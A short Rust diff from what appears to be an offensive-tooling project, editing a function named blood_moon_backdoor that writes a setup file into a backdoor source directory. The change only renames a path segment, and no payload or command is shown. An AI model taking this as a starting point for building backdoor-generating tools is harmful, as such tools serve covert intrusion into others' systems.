@@ -32,7 +32,7 @@ pub fn blood_moon_backdoor(config: BloodMoonBackdoorConfig, debug: bool) -> bool
     let report_config = read_meow("/var/witch_craft/witch_spells/embedded/config.meow", false);
     let path = format!(
         "{}{}",
-        report_config["PRIVATE_MODULES"], "blood/blood_moon_backdoor/backdoor/src/core/setup.rs"
+        report_config["PRIVATE_MODULES"], "blood_moon/blood_moon_backdoor/backdoor/src/core/setup.rs"
     );
 
     match File::create(&path) {
@@ -43,7 +43,7 @@ pub fn blood_moon_backdoor(config: BloodMoonBackdoorConfig, debug: bool) -> bool
             let report_config = read_meow("/var/witch_craft/witch_spells/embedded/config.meow", false);
             let path = format!(
                 "{}{}",
-                report_config["PRIVATE_MODULES"], "blood/blood_moon_backdoor/backdoor/"
+                report_config["PRIVATE_MODULES"], "blood_moon/blood_moon_backdoor/backdoor/"
             );
 
             let command = vec![
